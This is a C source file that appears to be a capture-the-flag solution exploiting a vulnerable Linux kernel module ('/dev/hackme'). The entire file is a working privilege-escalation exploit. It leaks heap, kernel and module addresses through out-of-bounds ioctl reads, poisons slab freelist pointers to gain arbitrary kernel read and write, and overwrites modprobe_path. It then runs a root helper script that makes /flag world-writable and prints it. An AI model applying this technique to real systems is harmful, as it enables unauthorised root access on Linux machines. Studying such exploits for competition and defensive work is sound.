/*************************************************************
 * File Name: exp_heap.c
 * 
 * Created on: 2019-11-04 06:04:15
 * Author: raycp
 * 
 * Last Modified: 2019-11-14 04:26:33
 * Description: heap overflow to form arbitrary read write vuln
************************************************************/

#include <stdio.h>
#include <inttypes.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>


#define DEV_NAME "/dev/hackme"

struct user_input
{
    uint32_t idx;
    uint32_t pad;
    char *data_ptr;
    uint64_t size;
    uint64_t offset;
};

void die(const char* msg)
{
    perror(msg);
    _exit(-1);
            
}


void ko_malloc(int fd, uint32_t idx, char* data_ptr, uint64_t size)
{
    struct user_input input;
    input.idx = idx;
    input.data_ptr = data_ptr;
    input.size = size;

    int ret;

    ret = ioctl(fd, 0x30000, &input);
    if(ret == -1) {
        die("malloc error");
    }
    return ;
}

void ko_read(int fd, uint32_t idx, char* data_ptr, uint64_t size, uint64_t offset)
{

    struct user_input input;
    input.idx = idx;
    input.data_ptr = data_ptr;
    input.size = size;
    input.offset = offset;

    int ret;

    ret = ioctl(fd, 0x30003, &input);
    if(ret == -1) {
        die("read error");
    }
    return ;
}


void ko_write(int fd, uint32_t idx, char* data_ptr, uint64_t size, uint64_t offset)
{

    struct user_input input;
    input.idx = idx;
    input.data_ptr = data_ptr;
    input.size = size;
    input.offset = offset;

    int ret;

    ret = ioctl(fd, 0x30002, &input);
    if(ret == -1) {
        die("write error");
    }
}

void ko_free(int fd, uint32_t idx )
{

    struct user_input input;
    input.idx = idx;

    int ret;

    ret = ioctl(fd, 0x30001, &input);
    if(ret == -1) {
        die("free error");
    }
}

int main()
{
    uint32_t idx; 
    char data_ptr[0x1000];
    uint64_t size;
    uint64_t offset;

    int fd = open(DEV_NAME, O_RDONLY);
    if (fd == -1)
        die("open dev error");

    // malloc 5 chunk first
    size = 0x100;
    ko_malloc(fd, 0, data_ptr, size);
    ko_malloc(fd, 1, data_ptr, size);
    ko_malloc(fd, 2, data_ptr, size);
    ko_malloc(fd, 3, data_ptr, size);
    ko_malloc(fd, 4, data_ptr, size);

    // delete the 1st and 3rd chunk to form 3rd->fd point to 1st chunk address
    ko_free(fd, 1);
    ko_free(fd, 3);
    
    // oob to read 3rd chunk's fd to get heap address
    idx = 4;
    offset = -0x100;
    size = 0x100;
    ko_read(fd, idx, data_ptr, size, offset);
    
    uint64_t kheap_ptr = *(uint64_t *)data_ptr;
    printf("[+] leaking kheap address: 0x%lx\n", kheap_ptr);

    // oob to read data before 0 chunk to leak kernel base
    idx = 0;
    offset = -0x100;
    size = 0x100;
    ko_read(fd, idx, data_ptr, size, offset);

    uint64_t kernel_base = *(uint64_t*)(data_ptr+0x28) - 0x849ae0;
    printf("[+] leaking kernel base address: 0x%lx\n", kernel_base);
    //pwndbg> print 0xffffffffc0234000-0xffffffff91e00000
    //$2 = 0x2e434000
    // fake fd: mod_tree + 0x40
    uint64_t fake_fd =  kernel_base + 0x811040;

    // read 3rd chunk data first.
    idx = 4;
    offset = -0x100;
    size = 0x100;
    ko_read(fd, idx, data_ptr, size, offset);
    
    // overwrite 3rd's fd to fake_fd
    *(uint64_t*)data_ptr = fake_fd;
    ko_write(fd, idx, data_ptr, size, offset);
    // malloc out the fake_fd
    ko_malloc(fd, 5, data_ptr, size);
    ko_malloc(fd, 6, data_ptr, size);
    // read mod_tree data out and get the module base
    idx = 6;
    offset = -0x40;
    size = 0x40;
    ko_read(fd, idx, data_ptr, size, offset);

    uint64_t module_base = *(uint64_t*) (data_ptr+0x18);
    printf("[+] leaking module base: 0x%lx\n", module_base);
    
    // malloc out pool array to achieve arbitrary read write
    ko_free(fd, 2);
    ko_free(fd, 5);

    idx = 4;
    offset = -0x100;
    size = 0x100;
    
    // fake_fd point to pool array
    fake_fd = module_base + 0x2400 + 0xa0;

    *(uint64_t*)data_ptr = fake_fd;
    ko_write(fd, idx, data_ptr, size, offset);

    ko_malloc(fd, 7, data_ptr, size);
    ko_malloc(fd, 8, data_ptr, size);

    idx = 8;
    offset = -0xa0;
    size = 0xa0;
    ko_read(fd, idx, data_ptr, size, offset);

    // overwrite the pool array point to modprobe_path
    uint64_t modprobe_path_addr = kernel_base + 0x83f960;
    *(uint64_t*)data_ptr = modprobe_path_addr;
    idx = 8;
    offset = -0xa0;
    size = 0xa0;
    ko_write(fd, idx, data_ptr, size, offset);

    // overwrite modprobe_path data to get_flag.sh
    strcpy(data_ptr, "/home/pwn/get_flag.sh\x00");

    idx = 0;
    offset = 0;
    size = strlen(data_ptr);
    ko_write(fd, idx, data_ptr, size, offset);

    // trigger __request_module to reviese /flag property
    system("echo -ne '#!/bin/sh\nchmod 777 /flag\n' > /home/pwn/get_flag.sh");
    system("chmod +x /home/pwn/get_flag.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/dummy");
    system("chmod +x /home/pwn/dummy");

    system("/home/pwn/dummy 2&>/dev/null");
    system("cat /flag");

    return 0;
}
